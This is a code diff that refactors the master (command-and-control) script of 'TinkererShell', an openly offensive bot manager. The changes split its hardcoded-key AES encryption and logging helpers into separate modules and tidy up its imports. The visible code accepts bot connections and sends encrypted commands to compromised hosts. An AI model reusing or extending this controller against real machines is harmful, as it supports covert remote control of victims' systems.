@@ -1,22 +1,20 @@
-#!/usr/bin/python
+#!/usr/bin/python3.7
 # -*- coding: utf-8 -*-
 """TinkererShell master, a simple bots manager.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
 import cmd
 import datetime
-import json
 import os
 import sys
 import threading
-import time
-from base64 import b64encode, b64decode
+from time import sleep
+from base64 import b64decode
 from random import randrange
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, timeout
 
-# pycryptodome
-# noinspection PyPackageRequirements
-from Crypto.Cipher import AES
+from my_crypt_func import encode_aes, decode_aes
+from my_logger import logging
 
 connected_sockets = []
 active_bot = 1000
@@ -68,7 +66,7 @@ def connection_gate():
                 # Send encrypted data's length encrypted
                 conn_gate.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
-                time.sleep(1)
+                sleep(1)
                 # Send encrypted data
                 conn_gate.send(bytes(encrypted, 'utf-8'))
                 threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
@@ -108,26 +106,13 @@ def handler(new_so, new_port, username):
                 # Send encrypted data's length encrypted
                 conn_handler.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
-                time.sleep(1)
+                sleep(1)
                 # Send encrypted data
                 conn_handler.send(bytes(encrypted, 'utf-8'))
-            time.sleep(60)
+            sleep(60)
             if thr_exit.isSet():
                 break
     conn_handler.close()
-
-
-def logging(data_to_log: str, printer=False) -> bool:
-    """Log data passed as argument and if needed print it also to the console.\n"""
-    if printer is True:
-        print(data_to_log)
-    try:
-        log_descriptor = open('sessionlog.txt', 'a')
-        log_descriptor.write('\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n' + data_to_log)
-        log_descriptor.close()
-    except Exception as exception_logging:
-        print(exception_logging)
-    return True
 
 
 def sender(data_to_send: str) -> bool:
@@ -139,7 +124,7 @@ def sender(data_to_send: str) -> bool:
     # Send encrypted data's length encrypted
     conn.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
     # Sleep 1 second to let the receiver decrypt the length packet.
-    time.sleep(1)
+    sleep(1)
     # Send encrypted data
     conn.send(bytes(encrypted, 'utf-8'))
     return True
@@ -333,32 +318,6 @@ def quit_utility() -> bool:
         return True
     logging(data_to_log='Operation aborted\n', printer=True)
     return False
-
-
-def encode_aes(text_input: str) -> str:
-    """Encode a string and output an json in string form.\n"""
-    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
-    lista = [ciphertext, tag, cipher.nonce]
-    json_k = ['ciphertext', 'tag', 'nonce']
-    json_v = [b64encode(x).decode('utf-8') for x in lista]
-    return json.dumps(dict(zip(json_k, json_v)))
-
-
-def decode_aes(json_input: str) -> str:
-    """Decode a string in json form and output a string.\n"""
-    try:
-        b64 = json.loads(json_input)
-        json_k = ['ciphertext', 'tag', 'nonce']
-        jv = {k: b64decode(b64[k]) for k in json_k}
-        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
-        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
-        return cleared
-    except Exception as exception_decode:
-        print(exception_decode)
-        print("Incorrect decryption")
 
 
 def command_executer():
@@ -600,6 +559,6 @@ if __name__ == '__main__':
 
     threading.Thread(target=connection_gate).start()
 
-    time.sleep(5)
+    sleep(5)
     # Start command loop
     BotSwitcher().cmdloop()
